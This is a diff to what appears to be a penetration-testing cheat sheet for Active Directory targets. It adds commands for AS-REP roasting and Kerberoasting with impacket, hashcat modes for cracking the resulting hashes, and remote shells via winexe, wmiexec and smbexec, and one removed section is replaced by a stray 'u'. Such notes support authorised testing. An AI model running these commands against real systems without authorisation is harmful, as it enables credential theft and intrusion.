@@ -112,12 +112,15 @@ INSERTKERBSCAN
 Find accounts with enum4linux, crackmapexec, ldapsearch, other sources..
 
 Accounts but no pass
-python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py <domain> -no-pass -usersfile users.txt
-Note: this only works is pre-auth is disabled, these hashes will be in -m 18200 (Kerberos 5 AS-REP etype 23)
-in hashcat, you may have to add the domain name to /etc/hosts
+Note: this only works is pre-auth is disabled
+1) Add the domain name to /etc/hosts
+2) python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py DOMAIN/ -no-pass -usersfile users.txt
+3) python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py DOMAIN/USER -no-pass
+Note: these hashes will be in -m 18200 (Kerberos 5 AS-REP etype 23) in hashcat
 
 Accounts and pass
-impacket-GetUserSPNs -dc-ip <INSERTIPADDRESS> domain/username[:password] -request
+If you have a user, get service accounts from rpcclient enumdomusers
+impacket-GetUserSPNs -dc-ip INSERTIPADDRESS domain.local/username[:password] -request
 Note: these will be in hashcat -m 13100
 
 ```
@@ -181,7 +184,9 @@ Password Policy
 crackmapexec smb --pass-pol INSERTIPADDRESS
 
 RCE
-winexe --system -U 'DOMAIN\USER%PASSWORD' //TARGET_IP cmd.exe
+winexe --system -U 'DOMAIN\USER%PASSWORD' //INSERTIPADDRESS cmd.exe
+impacket-wmiexec ./USER:PASS@INSERTIPADDRESS
+smbexec.py ./USER:PASS@INSERTIPADDRESS
 
 Windows Server GPP files
 \\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
@@ -190,14 +195,7 @@ Look for XML files such as Drives.xml, DataSources.xml, Groups.xml, Printers.xml
 
 ### Password Policy
 INSERTSAMRDUMP
-
-```
-https://blog.ropnop.com/using-credentials-to-own-windows-boxes/
-enum4linux -a INSERTIPADDRESS
-rpcclient -U "" INSERTIPADDRESS
-smbclient //INSERTIPADDRESS/ipc$ 
-impacket tools
-```
+u
 
 ### Port 161/162 UDP - SNMP
 INSERTSNMPSCAN
